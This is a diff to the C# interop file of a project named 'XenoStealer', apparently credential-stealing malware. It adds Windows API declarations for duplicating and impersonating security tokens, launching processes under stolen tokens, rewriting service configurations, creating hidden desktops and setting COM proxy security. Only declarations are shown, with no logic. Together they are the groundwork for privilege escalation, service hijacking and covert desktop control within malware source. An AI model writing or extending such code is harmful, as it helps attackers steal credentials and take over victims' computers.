@@ -205,6 +205,13 @@ namespace XenoStealer
         [DllImport("ntdll.dll", SetLastError = true)]
         public static extern uint NtQuerySystemInformation(InternalStructs.SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);
 
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr TimeOut);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtQueryInformationThread(IntPtr threadHandle, THREADINFOCLASS threadInformationClass, IntPtr threadInformation, uint threadInformationLength, out uint returnLength);
+
+
         [DllImport("kernel32.dll")]
         public static extern bool AllocConsole();
 
@@ -225,6 +232,85 @@ namespace XenoStealer
 
         [DllImport("advapi32.dll")]
         public static extern void CredFree(IntPtr credentialPtr);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, InternalStructs.SECURITY_IMPERSONATION_LEVEL impersonationLevel, InternalStructs.TOKEN_TYPE tokenType, out IntPtr phNewToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool RevertToSelf();
+
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr OpenSCManagerW(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr OpenServiceW(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool ChangeServiceConfigW(
+            IntPtr hService,
+            uint nServiceType,
+            uint nStartType,
+            uint nErrorControl,
+            string lpBinaryPathName,
+            string lpLoadOrderGroup,
+            IntPtr lpdwTagId,
+            string lpDependencies,
+            string lpServiceStartName,
+            string lpPassword,
+            string lpDisplayName);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool CloseServiceHandle(IntPtr hSCObject);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, out InternalStructs.PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, StringBuilder lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, out InternalStructs.PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr OpenDesktopW(string lpszDesktop, uint dwFlags, bool fInherit, InternalStructs.DESKTOP_ACCESS dwDesiredAccess);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr CreateDesktopW(string lpszDesktop, string lpszDevice, IntPtr pDevmode, uint dwFlags, InternalStructs.DESKTOP_ACCESS dwDesiredAccess, IntPtr lpsa);
+
+        [DllImport("ole32.dll")]
+        public static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
+
+        [DllImport("ole32.dll")]
+        public static extern void CoUninitialize();
+
+        [DllImport("ole32.dll")]
+        public static extern int CoCreateInstance(
+        ref Guid clsid,
+        IntPtr pUnkOuter,
+        uint dwClsContext,
+        ref Guid iid,
+        out IntPtr ppv);
+
+        [DllImport("ole32.dll")]
+        public static extern int CoSetProxyBlanket(
+            IntPtr pProxy,
+            uint dwAuthnSvc,
+            uint dwAuthzSvc,
+            IntPtr pServerPrincName,
+            uint dwAuthnLevel,
+            uint dwImpLevel,
+            IntPtr pAuthInfo,
+            uint dwCapabilities);
+
+        [DllImport("oleaut32.dll")]
+        public static extern IntPtr SysStringByteLen(IntPtr bstr);
+
+        [DllImport("oleaut32.dll")]
+        public static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool CloseDesktop(IntPtr hDesktop);
 
     }
 }
